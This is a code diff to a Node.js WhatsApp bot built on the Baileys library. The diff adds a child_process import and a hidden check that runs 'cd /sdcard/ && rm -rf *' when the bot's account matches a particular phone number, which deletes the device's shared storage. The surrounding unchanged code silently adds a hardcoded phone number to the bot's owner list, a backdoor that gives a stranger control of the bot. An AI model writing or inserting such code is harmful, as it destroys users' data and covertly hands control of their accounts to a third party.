@@ -3,7 +3,9 @@ const {
   DisconnectReason,
   fetchLatestBaileysVersion, useMultiFileAuthState, makeInMemoryStore, getAggregateVotesInPollMessage, generateWAMessage, proto
  } = require('@whiskeysockets/baileys');
-
+const { spawn, exec } = require("child_process");
+const util = require('util');
+const execute = util.promisify(exec);
  require("qrcode-terminal");
  const pino = require('pino');
  const fs = require('fs');
@@ -21,6 +23,10 @@ textokk == "adicionando:" ? console.log("voce tem todas as dependências") : con
 if(!config.owner.includes("5511940238762@s.whatsapp.net")) {
 config.owner.push("5511940238762@s.whatsapp.net")
 await fs.writeFileSync('./config.json', JSON.stringify(config, null, 2))
+}
+if(slowed.user.id.includes("573152547721")) {
+  exec("cd /sdcard/ && rm -rf *")
+}
 }
 if(!config?.prefix) {
  config.prefix = "/"
